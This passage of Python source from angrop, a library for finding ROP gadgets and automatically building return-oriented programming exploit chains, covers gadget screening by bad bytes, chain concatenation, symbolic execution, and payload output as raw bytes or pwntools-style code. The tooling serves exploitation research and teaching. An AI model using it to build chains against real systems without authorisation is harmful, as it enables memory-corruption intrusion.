                          allow smaller gadget size
        :param is_thumb:  execute ROP chain in thumb mode. Only makes difference on ARM architecture.
                          angrop does not switch mode within a rop chain
        :param kernel_mode: find kernel mode gadgets
        :param stack_gsize: change the maximum allowable stack change for gadgets, where
                            the max stack_change = stack_gsize * arch.bytes
        :param cond_br: whether to support conditional branches, this option impacts gadget finding speed significantly
        :return:
        """

        # private list of RopGadget's
        self._all_gadgets: list[RopGadget] = [] # all types of gadgets
        # all equivalent gadgets (with the same instructions)
        self._duplicates: dict = None # type: ignore

        # public list of RopGadget's
        self.rop_gadgets = [] # gadgets used for ROP, like pop rax; ret
        self.pivot_gadgets = [] # gadgets used for stack pivoting, like mov rsp, rbp; ret
        self.syscall_gadgets = [] # gadgets used for invoking system calls, such as syscall; ret or int 0x80; ret

        # RopChain settings
        self.badbytes = []
        self.roparg_filler = None

        # gadget finder configurations
        self.gadget_finder = GadgetFinder(self.project, fast_mode=fast_mode, only_check_near_rets=only_check_near_rets,
                                          max_block_size=max_block_size, max_sym_mem_access=max_sym_mem_access,
                                          is_thumb=is_thumb, kernel_mode=kernel_mode, stack_gsize=stack_gsize,
                                          cond_br=cond_br, max_bb_cnt=max_bb_cnt)
        self.arch = self.gadget_finder.arch

        # chain builder
        self._chain_builder = None

        if rebase is not None:
            l.warning("rebase is deprecated in angrop!")

    def _screen_gadgets(self):
        # screen gadgets based on badbytes and gadget types
        self.rop_gadgets = []
        self.pivot_gadgets = []
        self.syscall_gadgets = []
        for g in self._all_gadgets:
            if self._contain_badbytes(g.addr):
                # in case the gadget contains bad byte, try to take an equivalent one from
                # the duplicates (other gadgets with the same instructions)
                block = self.project.factory.block(g.addr)
                h = self.gadget_finder.block_hash(block)
                addr = None
                if h not in self._duplicates:
                    continue
                for addr in self._duplicates[h]:
                    if not self._contain_badbytes(addr):
                        break
                if not addr:
                    continue
                g = self.gadget_finder.analyze_gadget(addr)
            if type(g) is RopGadget:
                self.rop_gadgets.append(g)
            if type(g) is PivotGadget:
                self.pivot_gadgets.append(g)
            if type(g) is SyscallGadget:
                self.syscall_gadgets.append(g)

        self.chain_builder.gadgets = self.rop_gadgets
        self.chain_builder.pivot_gadgets = self.pivot_gadgets
        self.chain_builder.syscall_gadgets = self.syscall_gadgets
        self.chain_builder.bootstrap()

    def analyze_addr(self, addr):
        """
        return a list of gadgets that starts from addr
        this is possible because of conditional branches
        """
        res = self.gadget_finder.analyze_gadget(addr, allow_conditional_branches=True)
        gs:list[RopGadget]|None = cast(list[RopGadget]|None, res)
        if not gs:
            return gs
        self._all_gadgets += gs
        self._screen_gadgets()
        return gs

    def analyze_gadget(self, addr):
        """
        return a gadget or None, it filters out gadgets containing conditional_branches
        if you'd like those, use analyze_addr
        """
        res = self.gadget_finder.analyze_gadget(addr, allow_conditional_branches=False)
        g = cast(RopGadget|None, res)
        if g is None:
            return g
        self._all_gadgets.append(g)
        self._screen_gadgets()
        return g

    def analyze_gadget_list(self, addr_list, processes=4, show_progress=True, optimize=True):
        """
        Analyzes a list of addresses to identify ROP gadgets.
        Saves rop gadgets in self.rop_gadgets
        Saves syscall gadgets in self.syscall_gadgets
        Saves stack pivots in self.stack_pivots
        :param processes: number of processes to use
        :param show_progress: whether or not to show progress bar
        """

        self._all_gadgets = self.gadget_finder.analyze_gadget_list(
            addr_list, processes=processes, show_progress=show_progress)
        self._screen_gadgets()
        if optimize:
            self.chain_builder.optimize(processes=processes)
        return self.rop_gadgets

    def find_gadgets(self, optimize=True, **kwargs):
        """
        Finds all the gadgets in the binary by calling analyze_gadget on every address near a ret.
        Saves rop gadgets in self.rop_gadgets
        Saves syscall gadgets in self.syscall_gadgets
        Saves stack pivots in self.stack_pivots
        :param processes: number of processes to use
        :param optimize: whether to run chain_builder.optimize(), this may take some time,
                         but makes the chain builder more powerful
        """
        self._all_gadgets, self._duplicates = self.gadget_finder.find_gadgets(**kwargs)
        self._screen_gadgets()
        if optimize:
            processes = kwargs.get('processes', 4)
            self.chain_builder.optimize(processes=processes)
        return self.rop_gadgets

    def find_gadgets_single_threaded(self, show_progress=True, optimize=True):
        """
        Finds all the gadgets in the binary by calling analyze_gadget on every address near a ret
        Saves rop gadgets in self.rop_gadgets
        Saves syscall gadgets in self.syscall_gadgets
        Saves stack pivots in self.stack_pivots
        """
        self._all_gadgets, self._duplicates = self.gadget_finder.find_gadgets_single_threaded(
                                                                 show_progress=show_progress)
        self._screen_gadgets()
        if optimize:
            self.chain_builder.optimize(processes=1)
        return self.rop_gadgets

    def _get_cache_tuple(self):
        all_gadgets = self._all_gadgets
        for g in all_gadgets:
            g.project = None
        return (all_gadgets, self._duplicates)

    def _load_cache_tuple(self, tup):
        self._all_gadgets = tup[0]
        self._duplicates = tup[1]
        for g in self._all_gadgets:
            g.project = self.project
        self._screen_gadgets()

    def save_gadgets(self, path):
        """
        Saves gadgets in a file.
        :param path: A path for a file where the gadgets are stored
        """
        with open(path, "wb") as f:
            pickle.dump(self._get_cache_tuple(), f)
        for g in self._all_gadgets:
            g.project = self.project

    def load_gadgets(self, path, optimize=True):
        """
        Loads gadgets from a file.
        :param path: A path for a file where the gadgets are loaded
        """
        with open(path, "rb") as f:
            cache_tuple = pickle.load(f)
            self._load_cache_tuple(cache_tuple)
        if optimize:
            self.chain_builder.optimize()

    def set_badbytes(self, badbytes):
        """
        Define badbytes which should not appear in the generated ropchain.
        :param badbytes: a list of 8 bit integers
        """
        if not isinstance(badbytes, list):
            l.error("Require a list, e.g: [0x00, 0x09]")
            return
        badbytes = [x if type(x) == int else ord(x) for x in badbytes]
        self.badbytes = badbytes
        if self._chain_builder:
            self._chain_builder.set_badbytes(self.badbytes)
        self._screen_gadgets()

    def set_roparg_filler(self, roparg_filler):
        """
        Define rop gadget filler argument. These will be used if the rop chain needs to pop
        useless registers.
        If roparg_filler is None, symbolic values will be used and the concrete values will
        be whatever the constraint solver chooses (usually 0).
        :param roparg_filler: A integer which is used when popping useless register or None.
        """
        if not isinstance(roparg_filler, (int, type(None))):
            l.error("Require an integer, e.g: 0x41414141 or None")
            return

        self.roparg_filler = roparg_filler
        self.chain_builder.set_roparg_filler(self.roparg_filler)

    def get_badbytes(self):
        """
        Returns list of badbytes.
        :returns the list of badbytes
        """
        return self.badbytes

    @property
    def chain_builder(self):
        if self._chain_builder is not None:
            return self._chain_builder

        if len(self._all_gadgets) == 0:
            l.warning("Could not find gadgets for %s", self.project)
            l.warning("check your badbytes and make sure find_gadgets() or load_gadgets() was called.")
        self._chain_builder = chain_builder.ChainBuilder(self.project, self.rop_gadgets, self.pivot_gadgets,
                                                         self.syscall_gadgets, self.arch, self.badbytes,
                                                         self.roparg_filler)
        for f_name, f in inspect.getmembers(self._chain_builder, predicate=inspect.ismethod):
            if f_name.startswith("_"):
                continue
            setattr(self, f_name, f)
        return self._chain_builder

    # inspired by ropper
    def _contain_badbytes(self, addr):
        n_bytes = self.project.arch.bytes

        for b in self.badbytes:
            tmp_addr = addr
            for _ in range(n_bytes):
                if (tmp_addr & 0xff) == b:
                    return True
                tmp_addr >>= 8
        return False

register_analysis(ROP, 'ROP')

```

`angrop/rop_block.py`:

```py
import logging

from .rop_chain import RopChain
from .rop_value import RopValue
from .rop_gadget import RopGadget
from .rop_effect import RopEffect
from .errors import RopException
from . import rop_utils

l = logging.getLogger(__name__)

class RopBlock(RopChain, RopEffect):
    """
    A mini-chain that satisfies the following conditions:
    1. positive stack_change
    2. no accesses outside the stack_change
    3. no conditional branches: the flag should be set so the execution flow is determined
    4. self-contained, in the sense that it does not require extra gadgets to maintain
       the contain-flow
    """

    def __init__(self, project, builder, state=None, badbytes=None):
        RopChain.__init__(self, project, builder, state=state, badbytes=badbytes)
        RopEffect.__init__(self)

    def _chain_block(self, other):
        assert type(other) is RopBlock
        res = super().__add__(other)
        return res

    def __add__(self, other):
        res = self._chain_block(other)
        res._analyze_effect()
        return res

    def _analyze_effect(self):
        rb = self
        init_state, final_state = rb.sim_exec()

        ga = self._builder._gadget_analyzer

        # clear the effects
        rb.clear_effect()

        # stack change
        ga._compute_sp_change(init_state, final_state, rb)

        # reg effect
        ga._check_reg_changes(final_state, init_state, rb)
        ga._check_reg_change_dependencies(init_state, final_state, rb)
        ga._check_reg_movers(init_state, final_state, rb)
        ga._check_pop_equal_set(rb, final_state)

        # mem effect
        ga._analyze_concrete_regs(final_state, rb)
        ga._analyze_mem_access(final_state, init_state, rb)

        rb.bbl_addrs = list(final_state.history.bbl_addrs)
        project = init_state.project
        rb.isn_count = sum(project.factory.block(addr).instructions for addr in rb.bbl_addrs)

        # conditional branch analysis
        ga._cond_branch_analysis(rb, final_state)
        if rb.branch_dependencies:
            raise RopException("RopBlock should not have conditional branches")

    def sim_exec(self):
        project = self._p
        # this is different RopChain.exec because the execution needs to be symbolic
        state = self._blank_state.copy()
        for idx, val in enumerate(self._values):
            offset = idx*project.arch.bytes
            state.memory.store(state.regs.sp+offset, val.data, project.arch.bytes, endness=project.arch.memory_endness)

        state.ip = state.stack_pop()

        simgr = self._p.factory.simgr(state, save_unconstrained=True)
        while simgr.active:
            simgr.step()
            if len(simgr.active + simgr.unconstrained) != 1:
                l.warning("fail to sim_exec:\n%s", self.dstr())
                raise RopException("fail to sim_exec")
        final_state = simgr.unconstrained[0]
        return state, final_state

    @staticmethod
    def from_gadget(gadget, builder):
        assert isinstance(gadget, RopGadget)
        assert gadget.stack_change > 0
        assert not gadget.has_conditional_branch
        assert gadget.transit_type == 'pop_pc'

        # build the block(chain) state first
        project = builder.project
        bytes_per_pop = project.arch.bytes
        state = rop_utils.make_symbolic_state(
                                builder.project,
                                builder.arch.reg_list,
                                gadget.stack_change//bytes_per_pop)
        next_pc_val = rop_utils.cast_rop_value(
            state.solver.BVS("next_pc", project.arch.bits),
            project,
        )
        state.memory.store(state.regs.sp + gadget.pc_offset + bytes_per_pop, next_pc_val.ast,
                           endness=project.arch.memory_endness)
        state.stack_pop()
        state.ip = gadget.addr

        # now build the block(chain)
        rb = RopBlock(project, builder, state=state, badbytes=builder.badbytes)
        rb.import_effect(gadget)

        # fill in values and gadgets
        value = RopValue(gadget.addr, project)
        value.rebase_analysis(chain=rb)
        rb.add_value(value)
        for offset in range(0, gadget.stack_change, bytes_per_pop):
            sym_word = state.stack_read(offset, bytes_per_pop)
            sym_val = rop_utils.cast_rop_value(sym_word, project)
            if offset != gadget.pc_offset:
                rb.add_value(sym_val)
            else:
                rb.add_value(next_pc_val)

        rb.set_gadgets([gadget])
        return rb

    @staticmethod
    def from_gadget_list(gs, builder):
        assert gs
        rb = RopBlock.from_gadget(gs[0], builder)
        project = builder.project
        arch_bytes = project.arch.bytes
        for g in gs[1:]:
            if g.self_contained:
                rb = rb._chain_block(RopBlock.from_gadget(g, builder))
            elif g.stack_change >= 0 and g.transit_type == 'jmp_reg':
                init_state, final_state = rb.sim_exec()
                new_vals = []
                for offset in range(0, g.stack_change, arch_bytes):
                    tmp = final_state.memory.load(final_state.regs.sp+offset,
                                                  arch_bytes,
                                                  endness=project.arch.memory_endness)
                    new_vals.append(rop_utils.cast_rop_value(tmp, project))
                rb._values[rb.next_pc_idx()] = rop_utils.cast_rop_value(g.addr, project) # type: ignore

                final_state.solver.add(final_state.ip == g.addr)
                final_state = rop_utils.step_to_unconstrained_successor(project, final_state)
                rb._gadgets.append(g)
                rb._values += new_vals
                rb.payload_len += len(new_vals)*arch_bytes
                ip_hash = hash(final_state.ip)
                for idx, val in enumerate(rb._values):
                    if val.symbolic and hash(val.ast) == ip_hash:
                        next_pc_val = rop_utils.cast_rop_value(
                            init_state.solver.BVS("next_pc", project.arch.bits),
                            project,
                        )
                        rb._values[idx] = next_pc_val
            else:
                raise NotImplementedError("plz create an issue")
        rb._analyze_effect()
        return rb

    @staticmethod
    def from_chain(chain):
        state = chain._blank_state.copy()
        badbytes = chain._builder.badbytes
        rb = RopBlock(chain._p, chain._builder, state=state, badbytes=badbytes)
        rb._gadgets = chain._gadgets.copy()
        rb._values = chain._values.copy()
        rb.payload_len = chain.payload_len
        rb._analyze_effect()
        return rb

    def copy(self):
        cp = super().copy()
        cp = self.copy_effect(cp)
        return cp

```

`angrop/rop_chain.py`:

```py
import logging

import angr

from . import rop_utils
from .errors import RopException
from .rop_gadget import RopGadget
from .rop_value import RopValue

CHAIN_TIMEOUT_DEFAULT = 3

l = logging.getLogger("angrop.chain_builder.reg_setter")

class RopChain:
    """
    This class holds rop chains returned by the rop chain building methods such as rop.set_regs()
    """
    cls_timeout = CHAIN_TIMEOUT_DEFAULT

    def __init__(self, project, builder, state=None, badbytes=None):
        """
        """
        self._p = project
        self._pie = self._p.loader.main_object.pic
        self._builder = builder

        self._gadgets: list[RopGadget] = [] # gadgets in the order of execution
        self._values: list[RopValue] = [] # values on the stack

        # use self.payload_len in presentation layer, use self._payload in internal stuff
        # because next_pc is an internal mechanism, we don't expose it to users
        self.payload_len = 0

        # blank state used for solving
        self._blank_state = rop_utils.make_symbolic_state(self._p, builder.arch.reg_list, 0) if state is None else state
        self.badbytes = badbytes if badbytes else []

        self._timeout = self.cls_timeout

        self._pivoted = False
        self._init_sp = None

    def __add__(self, other):
        # need to add the values from the other's stack and the constraints to the result state
        result = self.copy()
        o_state = other._blank_state
        o_stack = o_state.memory.load(o_state.regs.sp, other.payload_len)
        result._blank_state.memory.store(result._blank_state.regs.sp + self.payload_len, o_stack)
        result._blank_state.add_constraints(*o_state.solver.constraints)
        if not other._values:
            return result
        # add the other values and gadgets
        result._gadgets.extend(other._gadgets)
        idx = self.next_pc_idx()
        assert idx is not None or not self._values, "can't add to a chain that does not return!"
        result.payload_len = self.payload_len + other.payload_len
        if idx is not None:
            result._values[idx] = other._values[0]
            result._values.extend(other._values[1:])
            result.payload_len -= self._p.arch.bytes
        else:
            result._values.extend(other._values)

        # FIXME: cannot handle cases where a rop_block is used twice and have different constraints
        # because right now symbolic values go with rop_blocks
        if self._blank_state.solver._solver.variables.intersection(other._blank_state.solver._solver.variables):
            if not result._blank_state.satisfiable():
                raise RopException("cannot use a rop_block with different constraints yet")

        return result

    def set_timeout(self, timeout):
        self._timeout = timeout

    @classmethod
    def set_cls_timeout(cls, timeout):
        cls.cls_timeout = timeout

    def add_value(self, value):
        if type(value) is not RopValue:
            value = RopValue(value, self._p)
            value.rebase_analysis(chain=self)
        self._values.append(value)
        self.payload_len += self._p.arch.bytes

    def add_gadget(self, gadget):
        value = gadget.addr
        if self._pie:
            value -= self._p.loader.main_object.mapped_base
        value = RopValue(value, self._p)
        value._rebase = self._pie is True

        if (idx := self.next_pc_idx()) is None:
            self.add_value(value)
        else:
            self._values[idx] = value

        self._gadgets.append(gadget)

    def set_gadgets(self, gadgets: list[RopGadget]):
        self._gadgets = gadgets

    def add_constraint(self, cons):
        """
        helpful if the chain contains variables
        """
        self._blank_state.add_constraints(cons)

    def next_pc_idx(self):
        """
        in some gadgets, we have this situation:
        pop pc,r1, which means pc is not the last popped value like ret (retn is another example)
        in these case, the value will be presented as symbolic "next_pc" in _values.
        it will be concretized when adding new gadgets or doing chain concatenation
        """
        for idx, x in enumerate(self._values):
            if x.symbolic and any(y.startswith("next_pc_") for y in x.ast.variables):
                return idx
        # chains that don't return don't have next_pc value
        return None

    def find_symbol(self, addr):
        plt = self._p.loader.find_plt_stub_name(addr)
        if plt:
            return plt + '@plt'
        symbol = self._p.loader.find_symbol(addr)
        if symbol:
            return symbol.name
        return None

    def _check_pivot(self, s):
        bits = self._p.arch.bits
        for act in s.history.actions.hardcopy:
            if act.type == 'reg' and act.action == 'write':
                reg_name = self._p.arch.translate_register_name(act.offset)
                if reg_name != self._builder.arch.stack_pointer:
                    continue
                diff = act.data.ast - self._init_sp
                if diff.symbolic:
                    self._pivoted = True
                    return
                value = diff.concrete_value
                if value >> (bits-1): # if the MSB is 1, this value is negative
                    value -= (1<<bits)
                if value >= 0x1000 or value < -0x1000:
                    self._pivoted = True
                    return

    def exec(self, timeout=None, stop_at_pivot=False):
        """
        symbolically execute the ROP chain and return the final state
        """
        # pylint: disable=possibly-used-before-assignment
        project = self._p
        state = self._blank_state.copy()
        concrete_vals = self._concretize_chain_values(timeout=timeout, preserve_next_pc=True, append_shift=False)

        # when the chain data includes symbolic values, we need to replace the concrete values
        # with the user's symbolic data
        values = concrete_vals
        for idx, val in enumerate(self._values):
            if not val.symbolic:
                continue
            if all(var.startswith("symbolic_stack") for var in val.ast.variables):
                continue
            values[idx] = (val.data, val.rebase)

        # now store all those values onto the stack
        for idx, val in enumerate(values):
            offset = idx*project.arch.bytes
            state.memory.store(state.regs.sp+offset, val[0], project.arch.bytes, endness=project.arch.memory_endness)
        state.regs.pc = state.stack_pop()

        if stop_at_pivot:
            self._pivoted = False
            self._init_sp = state.regs.sp
            bp = state.inspect.b('reg_write', when=angr.BP_AFTER, action=self._check_pivot)

        simgr = project.factory.simgr(state, save_unconstrained=True)

        # execute the chain using simgr
        while simgr.active:
            simgr.step()
            if stop_at_pivot and self._pivoted:
                states = simgr.active + simgr.unconstrained
                assert len(states) == 1
                states[0].inspect.remove_breakpoint('reg_write', bp) # type: ignore
                return states[0]
            if len(simgr.active + simgr.unconstrained) != 1:
                code = self.payload_code(print_instructions=True)
                l.error("The following chain fails to execute!")
                l.error(code)
                raise RopException("fail to execute")
        return simgr.unconstrained[0]

    def concrete_exec_til_addr(self, target_addr):
        project = self._p
        s = project.factory.blank_state()
        s.memory.store(s.regs.sp, self.payload_str())
        s.ip = s.stack_pop()
        simgr = project.factory.simgr(s)
        while simgr.one_active.addr != target_addr:
            simgr.step()
            assert len(simgr.active) == 1
        return simgr.one_active

    def sim_exec_til_syscall(self):
        project = self._p
        state = self._blank_state.copy()
        for idx, val in enumerate(self._values):
            offset = idx*project.arch.bytes
            state.memory.store(state.regs.sp+offset, val.data, project.arch.bytes, endness=project.arch.memory_endness)
        state.ip = state.stack_pop()
        return rop_utils.step_to_syscall(state)

    def copy(self):
        cp = self.__class__(self._p, self._builder)
        cp._gadgets = list(self._gadgets)
        cp._values = list(self._values)
        cp.payload_len = self.payload_len
        cp._blank_state = self._blank_state.copy()
        cp.badbytes = self.badbytes.copy()

        return cp

    #### Solver Layer ####
    def __concretize_chain_values(self, constraints=None):
        """
        with the flexibilty of chains to have symbolic values, this helper function
        makes the chain into a list of concrete ints before printing
        :param constraints: constraints to use when concretizing values
        :return: a list of tuples of type (int, needs_rebase)
        """
        solver_state = self._blank_state.copy()
        if constraints is not None:
            if isinstance(constraints, (list, tuple)):
                for c in constraints:
                    solver_state.add_constraints(c)
            else:
                solver_state.add_constraints(constraints)

        concrete_vals = []
        for value in self._values:
            # make sure it does not have badbytes in it
            ast = value.data
            constraints = []
            # for each byte, it should not be equal to any bad bytes
            # TODO: we should do the badbyte verification when adding values
            # not when concretizing them
            for idx in range(ast.length//8): # type: ignore
                b = ast.get_byte(idx)
                constraints += [ b != c for c in self.badbytes]
            # apply the constraints
            for expr in constraints:
                solver_state.solver.add(expr)
                if not solver_state.solver.satisfiable():
                    raise RopException("bad chain!")
            concrete_vals.append((solver_state.solver.eval(ast), value.rebase))

        return concrete_vals

    def _concretize_chain_values(self, constraints=None, timeout=None, preserve_next_pc=False, append_shift=False):
        """
        concretize chain values with a timeout
        """
        if self.next_pc_idx() is not None and append_shift:
            try:
                # the following line is the final touch for chains ending with retn-style
                # gadget to make sure that the next_pc is at the end of the chain
                chain = self + self._builder.chain_builder.shift(self._p.arch.bytes)
                values = chain._concretize_chain_values(
                                    constraints=constraints,
                                    timeout=timeout,
                                    preserve_next_pc=preserve_next_pc,
                                    append_shift=False,
                                )
                return values
            except RopException:
                pass
        if timeout is None:
            timeout = self._timeout
        values = rop_utils.timeout(timeout)(self.__concretize_chain_values)(constraints=constraints)
        if not preserve_next_pc:
            return values
        idx = self.next_pc_idx()
        if idx is None:
            return values
        values[idx] = (self._values[idx].ast, None)

        return values

    #### Presentation Layer ####
    def addr_to_asmstring(self, addr):
        for g in self._gadgets:
            if g.addr == addr:
                return g.dstr()
        return ""

    def _is_code_ptr(self, ptr):
        """
        try both sections and segments, some code is just mapped into
        executable segments not sections
        """
        sec = self._p.loader.find_section_containing(ptr)
        if sec and sec.is_executable:
            return True
        seg = self._p.loader.find_segment_containing(ptr)
        if seg and seg.is_executable:
            return True
        return False

    def payload_bv(self):
        test_state = self._blank_state.copy()

        for value in reversed(self._values):
            test_state.stack_push(value.data)

        sp = test_state.regs.sp
        return test_state.memory.load(sp, self.payload_len)

    def payload_str(self, constraints=None, base_addr=None, timeout=None):
        """
        :param base_addr: the base address of the binary
        :return: a string that does the rop payload
        """
        if base_addr is None:
            base_addr = self._p.loader.main_object.mapped_base
        test_state = self._blank_state.copy()
        concrete_vals = self._concretize_chain_values(constraints, timeout=timeout, append_shift=True)
        if self.next_pc_idx() == len(self._values) - 1:
            concrete_vals = concrete_vals[:-1]
        for value, rebased in reversed(concrete_vals):
            if rebased:
                test_state.stack_push(value - self._p.loader.main_object.mapped_base + base_addr)
            else:
                test_state.stack_push(value)
        sp = test_state.regs.sp
        rop_str = test_state.solver.eval(test_state.memory.load(sp, self.payload_len), cast_to=bytes)
        if any(bytes([c]) in rop_str for c in self.badbytes):
            raise RopException()
        return rop_str

    def payload_code(self, constraints=None, print_instructions=True, timeout=None):
        """
        :param print_instructions: prints the instructions that the rop gadgets use
        :return: prints the code for the rop payload
        """
        if self._p.arch.bits == 32:
            pack = "p32(%#x)"
            pack_rebase = "p32(code_base + %#x)"
        else:
            pack = "p64(%#x)"
            pack_rebase = "p64(code_base + %#x)"

        if self._pie:
            payload = "code_base = 0x0\n"
        else:
            payload = ""
        payload += 'chain = b""\n'

        concrete_vals = self._concretize_chain_values(constraints, timeout=timeout, append_shift=True)
        if self.next_pc_idx() == len(self._values) - 1:
            concrete_vals = concrete_vals[:-1]
        for value, rebased in concrete_vals:

            instruction_code = ""
            if print_instructions :
                if self._is_code_ptr(value):
                    symbol = self.find_symbol(value)
                    if symbol:
                        instruction_code = f"\t# {symbol}"
                    else:
                        asmstring = self.addr_to_asmstring(value)
                        if asmstring != "":
                            instruction_code = "\t# " + asmstring

            if rebased:
                value -= self._p.loader.main_object.mapped_base
                payload += "chain += " + pack_rebase % value + instruction_code
            else:
                payload += "chain += " + pack % value + instruction_code
            payload += "\n"
        return payload

    def print_payload_code(self, constraints=None, print_instructions=True):
        print(self.payload_code(constraints=constraints, print_instructions=print_instructions))

    def __str__(self):
        return self.payload_code()

    def dstr(self):
        res = ''
        bs = self._p.arch.bytes
        prefix_len = bs*2+2
        prefix = " "*prefix_len
        for v in self._values:
            if v.symbolic:
                res += prefix + f"  {v.ast}\n"
                continue
            for g in self._gadgets:
                if g.addr == v.concreted:
                    fmt = f"%#0{prefix_len}x"
                    res += fmt % g.addr + f": {g.dstr()}\n"
                    break
            else:
                res += prefix + f"  {v.concreted:#x}\n"
        return res

    def pp(self):
        print(self.dstr())

    def set_project(self, project):
        self._p = project
        for g in self._gadgets:
            g.project = project
        for val in self._values:
            val._project = project

    def set_builder(self, builder):
        self._builder = builder

    def __getstate__(self):
        state = self.__dict__.copy()
        state['_p'] = None
        state['_builder'] = None
        state['_blank_state'] = None
        return state

    def __setstate__(self, state):
        self.__dict__.update(state)

```

`angrop/rop_effect.py`:

```py
class RopMemAccess:
    """Holds information about memory accesses
    Attributes:
        addr_dependencies (set): All the registers that affect the memory address.
        addr_controller (set): All the registers that can determine the symbolic memory access address by itself
        addr_offset (int): Constant offset in the memory address relative to register(s)
        addr_stack_controller (set): all the controlled gadgets on the stack that can determine the address by itself
        data_dependencies (set): All the registers that affect the data written.
        data_controller (set): All the registers that can determine the symbolic data by itself
        addr_constant (int): If the address is a constant it is stored here.
        data_constant (int): If the data is constant it is stored here.
        addr_size (int): Number of bits used for the address.
        data_size (int): Number of bits used for data
    """
    def __init__(self):
        self.addr_dependencies = set()
        self.addr_controllers = set()
        self.addr_offset: int | None = None
        self.addr_stack_controllers = set()
        self.data_dependencies = set()
        self.data_controllers = set()
        self.data_stack_controllers = set()
        self.addr_constant = None
        self.stack_offset = None # addr_constant - init_sp
        self.data_constant = None
        self.addr_size = None
        self.data_size = None
        self.out_of_patch = False
        self.op = None

    def is_valid(self):
        """
        the memory access address must be one of
        1. constant
        2. controlled by registers
        3. controlled by controlled stack
        """
        return self.addr_constant or self.addr_controllers or self.addr_stack_controllers

    def is_symbolic_access(self):
        return self.addr_controllable() or bool(self.addr_dependencies)

    def addr_controllable(self):
        return bool(self.addr_controllers or self.addr_stack_controllers)

    def data_controllable(self):
        return bool(self.data_controllers or self.data_stack_controllers)

    def addr_data_independent(self):
        return len(set(self.addr_controllers) & set(self.data_controllers)) == 0 and \
                len(set(self.addr_stack_controllers) & set(self.data_stack_controllers)) == 0

    def __eq__(self, other):
        if type(other) != RopMemAccess:
            return False
        if self.addr_dependencies != other.addr_dependencies or self.data_dependencies != other.data_dependencies:
            return False
        if self.addr_controllers != other.addr_controllers or self.data_controllers != other.data_controllers:
            return False
        if self.addr_constant != other.addr_constant or self.data_constant != other.data_constant:
            return False
        if self.addr_size != other.addr_size or self.data_size != other.data_size:
            return False
        return True

class RopRegMove:
    """
    Holds information about Register moves
    Attributes:
        from_reg (string): register that started with the data
        to_reg (string): register that the data was moved to
        bits (int): number of bits that were moved
    """
    def __init__(self, from_reg, to_reg, bits):
        self.from_reg = from_reg
        self.to_reg = to_reg
        self.bits = bits

    def __hash__(self):
        return hash((self.from_reg, self.to_reg, self.bits))

    def __eq__(self, other):
        if type(other) != RopRegMove:
            return False
        return self.from_reg == other.from_reg and self.to_reg == other.to_reg and self.bits == other.bits

    def __lt__(self, other):
        if type(other) != RopRegMove:
            return False
        t1 = (self.from_reg, self.to_reg, self.bits)
        t2 = (other.from_reg, other.to_reg, other.bits)
        return t1 < t2

    def __repr__(self):
        return f"RegMove: {self.to_reg} <= {self.from_reg} ({self.bits} bits)"

class RopRegPop:
    """
    a class to represent register pop effect
    """
    def __init__(self, reg, bits):
        assert type(reg) is str
        self.reg = reg
        self.bits = bits

    def __hash__(self):
        return hash((self.reg, self.bits))

    def __eq__(self, other):
        if type(other) != RopRegPop:
            return False
        return self.reg == other.reg and self.bits == other.bits

    def __repr__(self):
        return f"<RegPop {self.reg}-{self.bits}bits>"

class RopEffect:
    """
    the overall effect of a gadget/rop_block
    """
    def __init__(self):

        self.stack_change: int = None # type: ignore

        # register effect information
        self.changed_regs = set()
        # Stores the stack variables that each register depends on.
        # Used to check for cases where two registers are popped from the same location.
        self.concrete_regs = {}
        self.reg_dependencies = {}  # like rax might depend on rbx, rcx
        self.reg_controllers = {}  # like rax might be able to be controlled by rbx (for any value of rcx)
        self.reg_pops = set()
        self.reg_moves = []

        # memory effect information
        self.mem_reads = []
        self.mem_writes = []
        self.mem_changes = []

        # List of basic block addresses for gadgets with conditional branches
        self.bbl_addrs = []
        # Instruction count to estimate complexity
        self.isn_count: int = None # type: ignore

        self.pop_equal_set = set() # like pop rax; mov rbx, rax; they must be the same

        # Registers that affect path constraints
        self.branch_dependencies = set()
        self.has_conditional_branch: bool = None # type: ignore

    @property
    def oop(self):
        """
        whether the gadget contains out of patch access
        """
        return any(m.out_of_patch  for m in self.mem_reads + self.mem_writes + self.mem_changes)

    def has_symbolic_access(self):
        return self.num_sym_mem_access > 0

    @property
    def max_stack_offset(self):
        project = getattr(self, "project", None)
        if project is None:
            project = getattr(self, "_p", None)
        res = self.stack_change - project.arch.bytes # type: ignore
        for m in self.mem_reads + self.mem_writes + self.mem_changes:
            if m.out_of_patch and m.stack_offset > res:
                res = m.stack_offset
        return res

    @property
    def num_sym_mem_access(self):
        """
        by definition, jmp_mem gadgets have one symbolic memory access, which is its PC
        we take into account that
        """
        # pylint: disable=no-member
        accesses = self.mem_reads + self.mem_writes + self.mem_changes
        res = len([x for x in accesses if x.is_symbolic_access()])
        if hasattr(self, "transit_type") and self.transit_type == 'jmp_mem' and self.pc_target.symbolic: # type: ignore
            assert res > 0
            res -= 1
        return res

    @property
    def popped_regs(self):
        return {x.reg for x in self.reg_pops}

    def get_pop(self, reg):
        for x in self.reg_pops:
            if x.reg == reg:
                return x
        return None

    def clear_effect(self):
        RopEffect.__init__(self)

    def import_effect(self, gadget):
        gadget.copy_effect(self)

    def copy_effect(self, cp):
        cp.stack_change = self.stack_change
        cp.changed_regs = set(self.changed_regs)
        cp.reg_pops = set(self.reg_pops)
        cp.concrete_regs = dict(self.concrete_regs)
        cp.reg_dependencies = dict(self.reg_dependencies)
        cp.reg_controllers = dict(self.reg_controllers)
        cp.reg_moves = list(self.reg_moves)
        cp.mem_reads = list(self.mem_reads)
        cp.mem_writes = list(self.mem_writes)
        cp.mem_changes = list(self.mem_changes)
        cp.bbl_addrs = list(self.bbl_addrs)
        cp.isn_count = self.isn_count
        return cp

```

`angrop/rop_gadget.py`:

```py
from angr import Project
from .rop_utils import addr_to_asmstring
from .rop_effect import RopEffect

class RopGadget(RopEffect):
    """
    Gadget objects
    """
    def __init__(self, addr):
        super().__init__()
        self.project: Project = None # type: ignore
        self.addr = addr

        # gadget transition
        # we now support the following gadget transitions
        # 1. pop_pc:    ret, jmp [sp+X], pop pc,X,Y, retn), this type of gadgets are "self-contained"
        # 2. jmp_reg:   jmp reg <- requires reg setting before using it (call falls here as well)
        # 3. jmp_mem:   jmp [reg+X] <- requires mem setting before using it (call falls here as well)
        self.transit_type: str = None # type: ignore
        # for pop_pc, ret is basically pc_offset == stack_change - arch.bytes
        self.pc_offset: int = None # type: ignore
        # for jmp_reg, which register it jumps to
        self.pc_reg: str = None # type: ignore
        # for jmp_mem, where it jumps to
        self.pc_target: int = None # type: ignore

    @property
    def self_contained(self):
        """
        the gadget is useable by itself, doesn't rely on the existence of other gadgets
